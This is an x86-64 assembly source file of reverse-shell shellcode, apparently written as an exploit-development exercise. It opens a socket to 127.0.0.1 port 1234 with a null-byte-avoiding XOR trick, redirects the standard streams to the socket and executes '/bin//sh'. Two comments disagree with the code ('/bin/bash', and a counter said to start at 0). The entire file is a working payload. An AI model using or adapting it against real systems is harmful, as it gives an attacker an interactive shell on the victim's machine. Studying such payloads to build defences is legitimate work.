BITS 64

; socket(AF_INET,SOCK_STREAM,IP_PROTO)
; connect(sockfd,struct sockaddr*,addrlen)
; dup2(sockfd, std*)
; execve('/bin/bash',0,0)

; socket syscall
; syscall number
push 0x29
pop rax
; AF_INET=2
push 0x2
pop rdi
; SOCK_STREAM=1
push 0x1
pop rsi
; IP_PROTO=0
xor rdx,rdx
; syscall
syscall
xchg rax,rdi

; connect syscall
; syscall number
mov al,0x2a
; sockfd in rdi already
; struct addr
; sin_addr=inet_aton('127.0.0.1'), XORed with 0xffffffff00000000
mov rcx,0xfeffff80
mov r8,0xffffffff
xor rcx,r8
push rcx
; sin_port=1234 (big endian)
push word 0xd204
; AF_INET=2
push word 0x2
mov rsi,rsp
; addrlen
push 0x10
pop rdx
; syscall
syscall

; dup2 syscall loop
; sockfd already in rdi
; init fd to 0 for looping
push 0x2
pop rsi
_loop:
; syscall number
mov al,0x21
syscall
dec rsi
jns _loop

; execve syscall
xor rax,rax
push rax
mov al, 0x3b
mov rdi, 0x68732f2f6e69622f
push rdi
mov rdi,rsp
xor rsi, rsi
xor rdx, rdx
syscall
